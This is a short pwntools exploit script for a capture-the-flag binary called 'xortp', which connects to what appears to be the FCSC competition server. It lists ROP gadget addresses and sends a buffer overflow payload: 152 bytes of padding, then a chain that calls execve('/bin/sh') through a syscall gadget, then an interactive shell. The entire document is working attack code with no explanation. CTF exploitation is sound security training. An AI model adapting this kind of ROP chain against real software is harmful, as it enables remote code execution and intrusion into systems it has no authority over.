from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

# gadgets

# 0x00000000004867a6 : pop rax ; pop rdx ; pop rbx ; ret
# 0x00000000004011a2 : syscall
# 0x000000000040f972 : pop rsi ; ret
# 0x0000000000401f60 : pop rdi ; ret

# 00498213 => /bin/sh in .rodata

pop_rax_rdx_rbx = 0x00000000004867a6
pop_rsi = 0x000000000040f972
pop_rdi = 0x0000000000401f60
addr_bin_sh = 0x00498213
syscall_gadget = 0x00000000004011a2

gdbscript = """
c
"""

io = remote("chall.fcsc.fr", 2105)
# io = gdb.debug("./xortp", gdbscript = gdbscript)

# offset 152: saved rip
# offset 144: saved rbp
io.sendline(cyclic(152) + \
            p64(pop_rdi) + p64(addr_bin_sh) + \
            p64(pop_rsi) + p64(0) + \
            p64(pop_rax_rdx_rbx) + p64(0x3b) + p64(0) + p64(0) + \
            p64(syscall_gadget)
                )
io.interactive()